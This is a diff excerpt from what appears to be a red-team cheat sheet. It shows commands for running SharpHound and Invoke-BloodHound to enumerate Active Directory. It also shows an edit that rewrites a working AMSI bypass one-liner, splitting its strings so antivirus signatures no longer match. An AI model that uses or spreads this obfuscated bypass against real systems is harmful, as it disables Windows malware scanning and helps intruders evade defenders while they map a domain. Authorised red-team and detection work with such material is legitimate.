@@ -73,8 +73,9 @@ dotnet inline-execute /tools/SharpHound.exe -c All --memcache --outputdirectory 
 Import-Module .\SharpHound.ps1
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp -ZipFileName bh.zip
 
-# AMSI bypass before loading (if needed)
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+# AMSI bypass before loading (if needed) — strings split to avoid AV signature matching
+$t = 'System.Management.Automation.Am' + 'siUtils'
+[Ref].Assembly.GetType($t).GetField(('am' + 'siInitFailed'),'NonPublic,Static').SetValue($null,$true)
 ```
 
 ### AzureHound (Azure AD)
